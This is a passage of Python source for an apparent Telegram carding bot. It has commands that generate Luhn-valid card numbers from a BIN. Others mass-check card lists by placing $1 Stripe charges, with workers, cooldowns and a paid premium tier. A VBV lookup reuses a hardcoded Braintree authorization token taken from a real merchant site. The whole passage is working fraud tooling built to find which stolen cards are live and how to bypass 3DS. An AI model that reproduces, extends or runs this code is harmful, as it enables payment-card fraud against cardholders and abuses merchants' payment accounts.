                return

            if len(bin_num) < 6:
                await update.message.reply_text("BIN must be at least 6 digits")
                return

            if amount <= 0 or amount > 100:
                await update.message.reply_text("Amount must be between 1 and 100")
                return

            if bin_num.startswith('3'):
                card_length = 15  # Amex
            elif bin_num.startswith(('30', '36', '38', '39')):
                card_length = 14  # Diners Club
            else:
                card_length = 16  # Visa, MC, Discover, etc.

            cards = []
            for _ in range(amount):
                while True:
                    remaining_length = card_length - len(bin_num)
                    card_number = bin_num + ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
                    if Commands.luhn_check(card_number):
                        exp_month = str(random.randint(1, 12)).zfill(2)
                        exp_year = str(random.randint(2024, 2030))
                        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
                        cards.append(f"{card_number}|{exp_month}|{exp_year}|{cvv}")
                        break

            bin_info = await get_bin_info(bin_num[:6])

            if amount <= 10:
                message = (
                    "Card Generator\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    f"[ᛋ] Bin: {bin_num}xxxx|{random.randint(1,12):02d}|20{random.randint(23,30)}|rnd\n"
                    "━━━━━━━━━━━━━━━━━\n" +
                    "\n".join([f"`{card}`" for card in cards]) + "\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    f"[ᛋ] Info: {bin_info.get('brand', 'Unknown')}\n"
                    f"[ᛋ] Bank: {bin_info.get('bank', 'Unknown')}\n"
                    f"[ᛋ] Country: {bin_info.get('country_name', 'Unknown')}\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    f"[ᛋ] Generate by: @{update.effective_user.username}"
                )

                await update.message.reply_text(message, parse_mode='MarkdownV2')
            else:
                with open('cards.txt', 'w') as f:
                    f.write("\n".join(cards))
                with open('cards.txt', 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename='cards.txt',
                        caption=f"Generated {amount} cards from BIN {bin_num}\nGenerated by: @{update.effective_user.username}"
                    )
                os.remove('cards.txt')

        except Exception as e:
            logger.error(f"Error in gen_command: {str(e)}")
            await update.message.reply_text("Usage: /gen <bin> <amount>")

    @staticmethod
    async def check_card(cc_data: str, update: Update) -> str:
        try:
            number, month, year, cvc = cc_data.split("|")

            # Get random user data for the transaction
            async with aiohttp.ClientSession() as session:
                async with session.get(RANDOM_USER_API) as response:
                    user_data = (await response.json())['results'][0]
                    first_name = user_data['name']['first']
                    last_name = user_data['name']['last']

            # Get Stripe token
            stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
            if not stripe_token:
                return "❌ Error: Could not get token"

            # Process payment
            payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
            result = payment_result.get('message', 'Unknown response')

            # Get BIN info
            bin_info = await CardChecker.check_bin(number[:6])

            # Format response
            response = f"""━━━━━━━━━━━━━━━
📌 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 🔥
━━━━━━━━━━━━━━━

💳 𝗖𝗮𝗿𝗱 ➜ {number}|{month}|{year}|{cvc}
🚪 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe 1$
📡 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {'✅' if 'success' in result.lower() else '❌'}
⚡ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}

━━━━━━━━━━━━━━━"""

            if bin_info:
                response += f"""
━━━━━━━━━━━━━━━
𝗕𝗶𝗻 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
━━━━━━━━━━━━━━━

🔍 𝗕𝗶𝗻 ➜ {number[:6]}
🏷️ 𝗕𝗿𝗮𝗻𝗱 ➜ {bin_info.get('brand', 'N/A')}
🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {bin_info.get('country_code', 'N/A')}
🇨🇴 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 𝗡𝗮𝗺𝗲 ➜ {bin_info.get('country_name', 'N/A')}
🏦 𝗕𝗮𝗻𝗸 ➜ {bin_info.get('bank', 'N/A')}
📶 𝗟𝗲𝘃𝗲𝗹 ➜ {bin_info.get('level', 'N/A')}
📌 𝗧𝘆𝗽𝗲 ➜ {bin_info.get('type', 'N/A')}

━━━━━━━━━━━━━━━
𝗥𝗲𝗾 ⌁ @{update.effective_user.username or 'N/A'}
𝗗𝗲𝘃𝗕𝘆 ⌁ @mumiru
━━━━━━━━━━━━━━━"""

            return response

        except Exception as e:
            return f"Error: {str(e)}"

    @staticmethod
    async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return
            
        user_id = update.effective_user.id
        is_premium = is_premium_user(user_id)
        
        # Check cooldown
        in_cooldown, remaining = Commands.check_cooldown(user_id)
        if in_cooldown:
            await update.message.reply_text(f"Please wait {remaining} seconds before using this command again.")
            return
            
        Commands.set_cooldown(user_id, is_premium)

        if not context.args:
            await update.message.reply_text("Please provide card details in format: number|month|year|cvc")
            return

        cc_data = context.args[0]
        result = await Commands.check_card(cc_data, update)
        await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=result,
                reply_to_message_id=update.message.message_id
            )

    @staticmethod
    async def validate_card(cc_data: str) -> tuple:
        try:
            parts = cc_data.strip().split("|")
            if len(parts) != 4:
                return False, "Invalid format"

            number, month, year, cvc = parts
            number = number.strip()
            month = month.strip()
            year = year.strip()
            cvc = cvc.strip()

            if not all(part.isdigit() for part in [number, month, year, cvc]):
                return False, "All parts must be numeric"

            if len(year) == 2:
                year = "20" + year

            if not (1 <= int(month) <= 12):
                return False, "Invalid month"

            if len(cvc) not in [3, 4]:
                return False, "Invalid CVC length"

            return True, (number, month, year, cvc)
        except Exception as e:
            return False, str(e)

    @staticmethod
    async def svv_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        if not context.args:
            await update.message.reply_text("Please provide card details in format:\n/svv number|month|year|cvc")
            return

        cc_data = context.args[0]
        valid, result = await Commands.validate_card(cc_data)

        if not valid:
            await update.message.reply_text(f"❌ {result}")
            return

        context.user_data['pending_cc'] = cc_data
        await update.message.reply_text("💳 Card Received\n⌛ Please provide your SK key (starts with sk_live_)")

    @staticmethod
    async def validate_sk(sk: str) -> bool:
        return bool(re.match(r'^sk_live_[A-Za-z0-9]{24,}$', sk))

    @staticmethod
    async def process_stripe_payment(sk: str, number: str, month: str, year: str, cvc: str) -> dict:
        try:
            # Create payment method
            pm_data = {
                "type": "card",
                "card[number]": number,
                "card[exp_month]": month,
                "card[exp_year]": year,
                "card[cvc]": cvc
            }

            headers = {
                "Authorization": f"Bearer {sk}",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": UserAgent().random
            }

            async with aiohttp.ClientSession() as session:
                # Create payment method
                async with session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers,
                    data=pm_data
                ) as pm_response:
                    if not pm_response.ok:
                        pm_json = await pm_response.json()
                        return {
                            "success": False, 
                            "message": pm_json.get("error", {}).get("message", "Payment method creation failed")
                        }

                    pm_id = (await pm_response.json()).get("id")

                # Create payment intent
                pi_data = {
                    "amount": 100,
                    "currency": "usd",
                    "payment_method": pm_id,
                    "confirm": True,
                    "off_session": True
                }

                async with session.post(
                    "https://api.stripe.com/v1/payment_intents",
                    headers=headers,
                    data=pi_data
                ) as pi_response:
                    return {
                        "success": True, 
                        "response": await pi_response.json()
                    }

        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    async def handle_sk_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        if 'pending_cc' not in context.user_data:
            return

        # Delete the SK message for security
        await update.message.delete()

        sk = update.message.text
        if not await Commands.validate_sk(sk):
            await update.message.reply_text("❌ Invalid SK key format!")
            return

        cc_data = context.user_data['pending_cc']
        del context.user_data['pending_cc']

        checking_message = await update.message.reply_text("⌛ Processing card...")

        try:
            number, month, year, cvc = cc_data.split("|")

            # Clean and validate the data
            number = number.strip()
            month = month.strip()
            year = year.strip()
            cvc = cvc.strip()

            if not all([number.isdigit(), month.isdigit(), year.isdigit(), cvc.isdigit()]):
                await checking_message.reply_text("❌ INVALID CARD FORMAT\n💳 " + cc_data)
                return

            # Ensure proper year format for Stripe API
            if len(year) == 2:
                year = "20" + year

            await checking_message.edit_text("⌛ Connecting to Stripe API...")
            result = await Commands.process_stripe_payment(sk, number, month, year, cvc)

            if not result["success"]:
                await checking_message.reply_text(f"❌ ERROR: {result['message']}\n💳 {cc_data}")
                return

            response = result["response"]

            if response.get("status") == "succeeded":
                msg = f"✅ APPROVED\n💳 {cc_data}\n💲 1$ CHARGED"
            elif response.get("error"):
                error = response["error"]
                code = error.get("decline_code", "").upper() or error.get("code", "").upper()

                if "insufficient_funds" in str(error):
                    msg = f"✅ INSUFFICIENT_FUNDS\n💳 {cc_data}"
                elif "security_code" in str(error):
                    msg = f"❌ INCORRECT_CVC\n💳 {cc_data}"
                elif "authentication_required" in str(error):
                    msg = f"❌ 3DS_REQUIRED\n💳 {cc_data}"
                else:
                    msg = f"❌ {code or 'DECLINED'}\n💳 {cc_data}"
            else:
                msg = f"❌ UNKNOWN ERROR\n💳 {cc_data}"

            await checking_message.reply_text(msg)

        except Exception as e:
            await checking_message.reply_text(f"❌ ERROR: {str(e)}\n💳 {cc_data}")

    @staticmethod
    async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id in MASS_CHECK_ACTIVE:
            MASS_CHECK_ACTIVE[user_id] = False
            await update.message.reply_text("🛑 Mass checking operation stopped.")

    @staticmethod
    async def process_mst_card(card, update, context, session_id, status_msg_id, session):
        try:
            number, month, year, cvc = card.split("|")

            # Get random user data for the transaction
            async with session.get(RANDOM_USER_API) as response:
                user_data = (await response.json())['results'][0]
                first_name = user_data['name']['first']
                last_name = user_data['name']['last']

            # Get Stripe token
            stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
            if not stripe_token:
                return {'status': 'failed', 'message': 'Could not get token', 'card': card}

            # Process payment
            payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
            result = payment_result.get('message', 'Unknown response')

            # Check for success keywords
            success_keywords = [
                "succeeded", "success", "Thank you", "approved", "complete", 
                "completed", "pass", "Thanks", "successful", "Saved payment method"
            ]

            is_success = any(keyword.lower() in str(result).lower() for keyword in success_keywords)

            return {
                'status': 'success' if is_success else 'failed',
                'message': result,
                'card': card
            }

        except Exception as e:
            return {'status': 'error', 'message': str(e), 'card': card}

    @staticmethod
    async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        user_id = update.effective_user.id
        is_premium = is_premium_user(user_id)
        
        # Check cooldown
        in_cooldown, remaining = Commands.check_cooldown(user_id, True)
        if in_cooldown:
            await update.message.reply_text(f"Please wait {remaining} seconds before using this command again.")
            return

        user_id = update.effective_user.id
        if not update.message.reply_to_message or not update.message.reply_to_message.document:
            await update.message.reply_text("Please reply to a file containing cards")
            return

        # Initialize user session
        session_id = user_id  #Using user_id as session ID for simplicity. Consider a more robust approach for production.
        USER_SESSIONS[session_id] = {
            'approved': 0,
            'declined': 0,
            'checked': 0,
            'total': 0,
            'active': True
        }
        MASS_CHECK_ACTIVE[session_id] = True

        try:
            file = await update.message.reply_to_message.document.get_file()
            content = (await file.download_as_bytearray()).decode('utf-8')
            cards = [line.strip() for line in content.split('\n') if '|' in line.strip()]
            total_cards = len(cards)
            
            # Check CC limit
            cc_limit = Commands.get_cc_limit(is_premium_user(user_id))
            if total_cards > cc_limit:
                await update.message.reply_text(
                    f"Free users can only check {cc_limit} CCs at once. "
                    "Upgrade to Premium (only $2/month) via @mumiru to check up to 250 CCs!"
                )
                return
                
            USER_SESSIONS[session_id]['total'] = total_cards
            Commands.set_cooldown(user_id, is_premium_user(user_id), True)

            # Determine worker count based on number of cards
            if total_cards <= 80:
                workers = 5
            elif total_cards <= 500:
                workers = 16
            else:
                workers = 35

            # Create initial status message
            status_msg = await update.message.reply_text(
                f"Antico Cleaner\n"
                f"Total Filtered Cards: {total_cards}\n\n"
                f"Please Wait Checking Your Cards 🟢\n\n"
                f"Gate -> Stripe Auth 🟢\n\n"
                f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                f"CC • \n\n"
                f"Status • \n\n"
                f"APPROVED !✔ • 0\n"
                f"DECLINED !✔ • 0\n"
                f"0 / {total_cards} •\n\n"
                f"Stop Check 🟢",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{session_id}")]
                ])
            )

            # Process cards with asyncio.`.gather for better concurrency
            semaphore = asyncio.Semaphore(workers)  # Limit concurrent tasks

            async def process_card_wrapper(card):
                async with semaphore:
                    if not MASS_CHECK_ACTIVE.get(session_id, True):
                        return None

                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
                        result = await Commands.process_mst_card(card, update, context, session_id, status_msg.message_id, session)

                    if result and result.get('status') == 'success':
                        USER_SESSIONS[session_id]['approved'] += 1
                        # Send approved card to user
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
                        )
                    else:
                        USER_SESSIONS[session_id]['declined'] += 1

                    USER_SESSIONS[session_id]['checked'] += 1

                    # Update status message
                    try:
                        await context.bot.edit_message_text(
                            chat_id=update.effective_chat.id,
                            message_id=status_msg.message_id,
                            text=(
                                f"Antico Cleaner\n"
                                f"Total Filtered Cards: {total_cards}\n\n"
                                f"Please Wait Checking Your Cards 🟢\n\n"
                                f"Gate -> Stripe Auth 🟢\n\n"
                                f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                                f"CC • {result.get('card', '')}\n\n"
                                f"Status • {'APPROVED 🟢' if result and result.get('status') == 'success' else 'DECLINED 🟢'}\n\n"
                                f"APPROVED !✔ • {USER_SESSIONS[session_id]['approved']}\n"
                                f"DECLINED !✔ • {USER_SESSIONS[session_id]['declined']}\n"
                                f"{USER_SESSIONS[session_id]['checked']} / {total_cards} •\n\n"
                                f"Stop Check 🟢"
                            ),
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{session_id}")]
                            ])
                        )
                    except Exception as e:
                        logger.error(f"Error updating status message: {str(e)}")

                    return result

            # Process cards in batches to avoid memory issues
            batch_size = 50
            for i in range(0, len(cards), batch_size):
                if not MASS_CHECK_ACTIVE.get(session_id, True):
                    break

                batch = cards[i:i + batch_size]
                await asyncio.gather(*[process_card_wrapper(card) for card in batch])

            # Final message if not stopped
            if MASS_CHECK_ACTIVE.get(session_id, False):
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg.message_id,
                    text=(
                        f"✅ Mass check completed!\n"
                        f"Approved: {USER_SESSIONS[session_id]['approved']}\n"
                        f"Declined: {USER_SESSIONS[session_id]['declined']}\n"
                        f"Total: {total_cards}"
                    )
                )
                MASS_CHECK_ACTIVE[session_id] = False

        except Exception as e:
            logger.error(f"Error in mst_command: {str(e)}")
            await update.message.reply_text(f"Error processing cards: {str(e)}")
        finally:
            if session_id in USER_SESSIONS:
                USER_SESSIONS[session_id]['active'] = False
            if session_id in MASS_CHECK_ACTIVE:
                MASS_CHECK_ACTIVE[session_id] = False

    @staticmethod
    async def process_mstt_card(card, update, context, user_id, status_msg_id):
        try:
            cc_number, exp_month, exp_year, cvc = card.split('|')

            result = await CardChecker.visit_website(cc_number, exp_month, exp_year, cvc)

            # Check for success keywords
            success_keywords = [
                "succeeded", "success", "Thank you", "approved", "complete", 
                "completed", "pass", "Thanks", "successful", "Saved payment method"
            ]

            is_success = any(keyword.lower() in str(result.get('message', '')).lower() for keyword in success_keywords)

            return {
                'status': 'success' if is_success else 'failed',
                'message': result.get('message', 'Unknown response'),
                'card': card
            }

        except Exception as e:
            return {'status': 'error', 'message': str(e), 'card': card}

    @staticmethod
    async def mstt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        user_id = update.effective_user.id
        if not update.message.reply_to_message or not update.message.reply_to_message.document:
            await update.message.reply_text("Please reply to a file containing cards")
            return

        # Initialize user session
        USER_SESSIONS[user_id] = {
            'approved': 0,
            'declined': 0,
            'checked': 0,
            'total': 0,
            'active': True
        }
        MASS_CHECK_ACTIVE[user_id] = True

        try:
            file = await update.message.reply_to_message.document.get_file()
            content = (await file.download_as_bytearray()).decode('utf-8')
            cards = [line.strip() for line in content.split('\n') if '|' in line.strip()]
            total_cards = len(cards)
            USER_SESSIONS[user_id]['total'] = total_cards

            # Determine worker count based on number of cards
            if total_cards <= 80:
                workers =5
            elif total_cards <= 500:
                workers = 16
            else:
                workers = 35

            # Create initial status message
            status_msg = await update.message.reply_text(
                f"Antico Cleaner\n"
                f"Total Filtered Cards: {total_cards}\n\n"
                f"Please Wait Checking Your Cards 🟢\n\n"
                f"Gate -> Stripe Auth 🟢\n\n"
                f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                f"CC • \n\n"
                f"Status • \n\n"
                f"APPROVED !✔ • 0\n"
                f"DECLINED !✔ • 0\n"
                f"0 / {total_cards} •\n\n"
                f"Stop Check 🟢",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
                ])
            )

            # Process cards with asyncio.gather for better concurrency
            semaphore = asyncio.Semaphore(workers)  # Limit concurrent tasks

            async def process_card_wrapper(card):
                async with semaphore:
                    if not MASS_CHECK_ACTIVE.get(user_id, True):
                        return None

                    result = await Commands.process_mstt_card(card, update, context, user_id, status_msg.message_id)

                    if result and result.get('status') == 'success':
                        USER_SESSIONS[user_id]['approved'] += 1
                        # Send approved card to user
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
                        )
                    else:
                        USER_SESSIONS[user_id]['declined'] += 1

                    USER_SESSIONS[user_id]['checked'] += 1

                    # Update status message
                    try:
                        await context.bot.edit_message_text(
                            chat_id=update.effective_chat.id,
                            message_id=status_msg.message_id,
                            text=(
                                f"Antico Cleaner\n"
                                f"Total Filtered Cards: {total_cards}\n\n"
                                f"Please Wait Checking Your Cards 🟢\n\n"
                                f"Gate -> Stripe Auth 🟢\n\n"
                                f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                                f"CC • {result.get('card', '')}\n\n"
                                f"Status • {'APPROVED 🟢' if result and result.get('status') == 'success' else 'DECLINED 🟢'}\n\n"
                                f"APPROVED !✔ • {USER_SESSIONS[user_id]['approved']}\n"
                                f"DECLINED !✔ • {USER_SESSIONS[user_id]['declined']}\n"
                                f"{USER_SESSIONS[user_id]['checked']} / {total_cards} •\n\n"
                                f"Stop Check 🟢"
                            ),
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
                            ])
                        )
                    except Exception as e:
                        logger.error(f"Error updating status message: {str(e)}")

                    return result

            # Process cards in batches to avoid memory issues
            batch_size = 50
            for i in range(0, len(cards), batch_size):
                if not MASS_CHECK_ACTIVE.get(user_id, True):
                    break

                batch = cards[i:i + batch_size]
                await asyncio.gather(*[process_card_wrapper(card) for card in batch])

            # Final message if not stopped
            if MASS_CHECK_ACTIVE.get(user_id, False):
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg.message_id,
                    text=(
                        f"✅ Mass check completed!\n"
                        f"Approved: {USER_SESSIONS[user_id]['approved']}\n"
                        f"Declined: {USER_SESSIONS[user_id]['declined']}\n"
                        f"Total: {total_cards}"
                    )
                )
                MASS_CHECK_ACTIVE[user_id] = False

        except Exception as e:
            logger.error(f"Error in mstt_command: {str(e)}")
            await update.message.reply_text(f"Error processing cards: {str(e)}")
        finally:
            if user_id in USER_SESSIONS:
                USER_SESSIONS[user_id]['active'] = False
            if user_id in MASS_CHECK_ACTIVE:
                MASS_CHECK_ACTIVE[user_id] = False

    @staticmethod
    async def stt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        # Check if command is already being processed for this chat
        chat_id = update.effective_chat.id
        if chat_id in COMMAND_LOCKS and COMMAND_LOCKS[chat_id]:
            await update.message.reply_text("⏳ Already processing a card, please wait...")
            return

        try:
            if len(context.args) < 1:
                await update.message.reply_text("Please provide CC info in format: /stt 5104040271954646|02|26|607")
                return

            COMMAND_LOCKS[chat_id] = True

            cc_info = context.args[0]
            parts = cc_info.split('|')
            if len(parts) != 4:
                await update.message.reply_text("Invalid format. Use: /stt 5104040271954646|02|26|607")
                return

            cc_number, exp_month, exp_year, cvc = parts

            # Send processing message
            processing_msg = await update.message.reply_text("🔄 Processing your card, please wait...")

            # Run validation
            result = await CardChecker.visit_website(cc_number, exp_month, exp_year, cvc)
            bin_info = await CardChecker.check_bin(cc_number[:6])

            # Format response
            status_emoji = "✅" if (result['status'] == 'success' or (isinstance(result['message'], str) and 'success' in result['message'].lower())) else "❌"

            response = f"""📌 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 🔥
━━━━━━━━━━━━━━━

💳 𝗖𝗮𝗿𝗱 ➜ {cc_number}|{exp_month}|{exp_year}|{cvc}
🚪 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe auth
📡 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {status_emoji}
⚡️ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result['message']}

━━━━━━━━━━━━━━━
𝗕𝗶𝗻 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
━━━━━━━━━━━━━━━

🔍 𝗕𝗶𝗻 ➜ {cc_number[:6]}
🏷️ 𝗕𝗿𝗮𝗻𝗱 ➜ {bin_info.get('brand', 'N/A')}
🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {bin_info.get('country_code', 'N/A')}
🇨🇴 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 𝗡𝗮𝗺𝗲 ➜ {bin_info.get('country_name', 'N/A')}
🏦 𝗕𝗮𝗻𝗸 ➜ {bin_info.get('bank', 'N/A')}
📶 𝗟𝗲𝘃𝗲𝗹 ➜ {bin_info.get('level', 'N/A')}
📌 𝗧𝘆𝗽𝗲 ➜ {bin_info.get('type', 'N/A')}

━━━━━━━━━━━━━━━
𝗥𝗲𝗾 ⌁ @{update.effective_user.username or 'N/A'}
𝗗𝗲𝘃𝗕𝘆 ⌁ @MUMIRU
━━━━━━━━━━━━━━━"""

            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=response
            )

        except Exception as e:
            await update.message.reply_text(f"Error processing your request: {str(e)}")
        finally:
            # Release the lock
            if chat_id in COMMAND_LOCKS:
                COMMAND_LOCKS[chat_id] = False

    @staticmethod
    async def vbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        if not context.args:
            await update.message.reply_text("Please provide card details in format: /vbv number|month|year|cvv")
            return

        cc_info = context.args[0]
        if '|' not in cc_info:
            await update.message.reply_text("Invalid format. Use: /vbv number|month|year|cvv")
            return

        try:
            parts = cc_info.split('|')
            if len(parts) != 4:
                await update.message.reply_text("Invalid format. Use: /vbv number|month|year|cvv")
                return

            cc, mes, ano, cvv = parts
            bin = cc[:6]

            # Token request headers and data
            token_headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDQxOTk4OTMsImp0aSI6ImZmYzdjZTVhLWUxZTYtNDNhMi05OWMxLWU0NzVhYjM4NGVlYiIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.fJcJAe_IP50wcKYgETiP10bgws8gtgMmddTQJSJH1TFpYYKkASPYaauvNEHjvt1K1_dOqpwtpbfMVCOi3cuxMw',
                'Braintree-Version': '2018-05-10',
                'Content-Type': 'application/json',
                'Origin': 'https://assets.braintreegateway.com',
                'User-Agent': UserAgent().random
            }

            token_json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': '5f636cc3-c174-44a9-9490-21492b8d9fab',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'cardholderName': 'luckg kumR',
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            async with aiohttp.ClientSession() as session:
                # Get token
                async with session.post('https://payments.braintree-api.com/graphql', headers=token_headers, json=token_json_data) as token_response:
                    token_data = await token_response.json()

                    if 'data' not in token_data or 'tokenizeCreditCard' not in token_data['data']:
                        await update.message.reply_text("Failed to get token from response")
                        return

                    token = token_data['data']['tokenizeCreditCard']['token']

                # Lookup request
                lookup_headers = {
                    'Accept': '*/*',
                    'Content-Type': 'application/json',
                    'Origin': 'https://literacytrust.org.uk',
                    'User-Agent': UserAgent().random
                }

                lookup_json_data = {
                    'amount': 1,
                    'additionalInfo': {
                        'acsWindowSize': '03',
                        'billingLine1': '5805 Chantry Dr',
                        'billingPostalCode': '43232',
                        'billingCountryCode': 'US',
                        'billingGivenName': 'saimon',
                        'billingSurname': 'dives',
                        'email': 'saimondives@gmail.com',
                    },
                    'bin': bin,
                    'dfReferenceId': '0_5c6c413a-e7b7-4a01-ab2b-64f42e2febb4',
                    'clientMetadata': {
                        'requestedThreeDSecureVersion': '2',
                        'sdkVersion': 'web/3.92.0',
                        'cardinalDeviceDataCollectionTimeElapsed': 138,
                        'issuerDeviceDataCollectionTimeElapsed': 3383,
                        'issuerDeviceDataCollectionResult': True,
                    },
                    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDQxOTk4OTMsImp0aSI6ImZmYzdjZTVhLWUxZTYtNDNhMi05OWMxLWU0NzVhYjM4NGVlYiIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.fJcJAe_IP50wcKYgETiP10bgws8gtgMmddTQJSJH1TFpYYKkASPYaauvNEHjvt1K1_dOqpwtpbfMVCOi3cuxMw',
                }

                lookup_url = f'https://api.braintreegateway.com/merchants/458w85bw8sbvhtfc/client_api/v1/payment_methods/{token}/three_d_secure/lookup'
                async with session.post(lookup_url, headers=lookup_headers, json=lookup_json_data) as lookup_response:
                    lookup_data = await lookup_response.json()

                    # Get BIN info
                    bin_info = await get_bin_info(bin)

                    if 'paymentMethod' in lookup_data and 'threeDSecureInfo' in lookup_data['paymentMethod']:
                        status = lookup_data['paymentMethod']['threeDSecureInfo']['status']
                        challenge_required = 'required' in status.lower()

                        response_text = f"""CC ⌁ {cc}|{mes}|{ano}|{cvv}
Status ⌁ {'Challenge Required ✅' if challenge_required else 'Challenge Not Required ❌'}
Message ⌁ {'3DS Required' if challenge_required else '3DS Not Required'}
Gateway ⌁ B3 VBV LookUp 🔍

Bin ⌁ {bin}
Bank ⌁ {bin_info.get('bank', 'Unknown')}
Country ⌁ {bin_info.get('country_name', 'Unknown')}
𝗥𝗲𝗾 ⌁ @{update.effective_user.username or 'N/A'}
𝗗𝗲𝘃𝗕𝘆 ⌁ @mumiru"""
                    else:
                        response_text = f"VBV lookup failed for {cc}|{mes}|{ano}|{cvv}"

                    await update.message.reply_text(response_text)

        except Exception as e:
            await update.message.reply_text(f"Error during VBV lookup: {str(e)}")

    @staticmethod
    async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        await update.message.reply_text("Operation cancelled.")
        return ConversationHandler.END

    @staticmethod
